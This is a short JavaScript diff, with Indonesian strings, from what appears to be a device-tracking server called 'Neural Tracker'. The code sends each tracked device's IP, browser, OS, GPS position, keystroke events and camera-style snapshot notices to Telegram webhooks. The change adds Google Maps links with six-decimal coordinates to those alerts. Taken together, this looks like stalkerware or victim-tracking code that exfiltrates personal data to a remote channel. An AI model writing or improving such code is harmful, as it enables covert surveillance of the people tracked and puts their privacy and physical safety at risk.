@@ -1199,7 +1199,7 @@ const AI_FEATURES = {
 async function sendAIAlert(deviceId, type, message) {
     const d = devices.get(deviceId);
     if (!d) return;
-    const text = `[Neural AI]\nDevice: ${d.label}\nType: ${type}\nWaktu: ${new Date().toLocaleString('id-ID')}\n${message}`;
+    const text = `[Neural AI]\nDevice: ${d.label}\nType: ${type}\nWaktu: ${new Date().toLocaleString('id-ID')}\n${message}\n${d.location ? 'Map: https://www.google.com/maps?q='+d.location.lat.toFixed(6)+','+d.location.lng.toFixed(6) : ''}`;
     for (const url of webhooks.telegram) {
         try {
             await fetch(url.replace('{text}', encodeURIComponent(text)), {
@@ -2034,7 +2034,7 @@ async function sendWebhook(deviceId, eventType, data) {
     if (eventType === 'new_device') {
         extraInfo = `IP: ${d.ip || 'N/A'}\nBrowser: ${profile.browser}\nOS: ${profile.os}\nDevice: ${profile.deviceType}`;
     } else if (eventType === 'location_update' && data && data.location) {
-        extraInfo = `Lat: ${data.location.lat.toFixed(4)}\nLng: ${data.location.lng.toFixed(4)}\nAkurasi: ${data.location.accuracy ? data.location.accuracy.toFixed(0) + 'm' : 'N/A'}`;
+        extraInfo = `Lat: ${data.location.lat.toFixed(4)}\nLng: ${data.location.lng.toFixed(4)}\nAkurasi: ${data.location.accuracy ? data.location.accuracy.toFixed(0) + 'm' : 'N/A'}\nMap: https://www.google.com/maps?q=${data.location.lat.toFixed(6)},${data.location.lng.toFixed(6)}`;
     } else if (eventType === 'forensics_alert') {
         extraInfo = `Tipe: ${data.type}\nDetail: ${data.detail}`;
     } else if (eventType === 'keystroke') {
@@ -2043,7 +2043,7 @@ async function sendWebhook(deviceId, eventType, data) {
         extraInfo = `Snapshot baru tersedia`;
     }
     
-    const text = `[Neural Tracker]\nDevice: ${d.label}\nID: ${deviceId.slice(0,8)}\nEvent: ${eventType}\nWaktu: ${timeStr}\n${extraInfo}\nLocation: ${d.location ? d.location.lat.toFixed(4)+','+d.location.lng.toFixed(4) : 'N/A'}\nRisk: ${profile.riskLevel}`;
+    const text = `[Neural Tracker]\nDevice: ${d.label}\nID: ${deviceId.slice(0,8)}\nEvent: ${eventType}\nWaktu: ${timeStr}\n${extraInfo}\nLocation: ${d.location ? d.location.lat.toFixed(4)+','+d.location.lng.toFixed(4) : 'N/A'}\nMap: ${d.location ? 'https://www.google.com/maps?q='+d.location.lat.toFixed(6)+','+d.location.lng.toFixed(6) : 'N/A'}\nRisk: ${profile.riskLevel}`;
     const shortText = `[Neural] ${d.label}: ${eventType}`;
 
     for (const url of webhooks.telegram) {
